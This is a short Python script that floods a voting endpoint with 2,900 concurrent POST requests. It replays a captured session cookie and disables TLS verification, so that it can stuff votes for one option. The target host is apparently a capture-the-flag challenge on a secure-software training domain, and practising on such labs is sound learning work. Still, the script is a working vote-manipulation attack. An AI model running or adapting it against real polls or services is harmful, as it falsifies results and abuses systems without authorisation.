import asyncio
import httpx

url = "https://chl-c3b5e087-53b5-4ff0-814f-749b45ecfecc-votacion.softwareseguro.com.ar/src/ctl/votacion.ctl.php"

headers = {
    "Cookie": "PHPSESSID=ed0bbe67c304610b192751bab4ec82ea;",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Accept-Language": "es-ES,es;q=0.9",
    "Sec-Ch-Ua": "\"Not:A-Brand\";v=\"24\", \"Chromium\";v=\"134\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://chl-c3b5e087-53b5-4ff0-814f-749b45ecfecc-votacion.softwareseguro.com.ar",
    "Referer": "https://chl-c3b5e087-53b5-4ff0-814f-749b45ecfecc-votacion.softwareseguro.com.ar/",
}

data = {
    "opUniversidad": "1"
}


TOTAL_VOTOS = 2900

CONCURRENCY = 100

semaforo = asyncio.Semaphore(CONCURRENCY)


async def enviar_voto(nro, client):
    async with semaforo:
        try:
            response = await client.post(url, headers=headers, data=data, timeout=10.0)
            print(
                f"✅ Voto #{nro}: {response.status_code} - {response.text[:60]}")
        except Exception as e:
            print(f"❌ Voto #{nro} falló: {e}")


async def main():
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        tareas = [enviar_voto(i+1, client) for i in range(TOTAL_VOTOS)]
        await asyncio.gather(*tareas)


asyncio.run(main())
